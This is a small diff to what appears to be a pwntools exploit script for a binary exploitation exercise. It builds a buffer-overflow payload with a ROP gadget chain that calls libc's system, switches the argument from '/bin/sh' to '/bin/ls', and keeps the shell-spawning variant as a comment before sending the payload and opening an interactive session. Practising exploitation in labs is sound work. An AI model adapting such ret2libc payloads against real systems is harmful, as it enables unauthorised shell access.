@@ -17,6 +17,7 @@ system_address = 0x7ffff7c4b980
 puts_address = 0x7ffff7c783d0
 rop_address = 0x40101a
 
-payload = (b"K" * 63 + b"\x00") + (b"/bin/sh\x00" +  b"K" * 56)  + b"F" * 3 * 64 + b"F" * 24 + 14 * p64(rop_address, "little") + p64(system_address, "little")
+payload = (b"K" * 63 + b"\x00") + (b"/bin/ls\x00" +  b"K" * 56)  + b"F" * 3 * 64 + b"F" * 24 + 14 * p64(rop_address, "little") + p64(system_address, "little")
+# payload = (b"K" * 63 + b"\x00") + (b"/bin/sh\x00" +  b"K" * 56)  + b"F" * 3 * 64 + b"F" * 24 + p64(system_address, "little")
 target.sendline(payload)
 target.interactive()
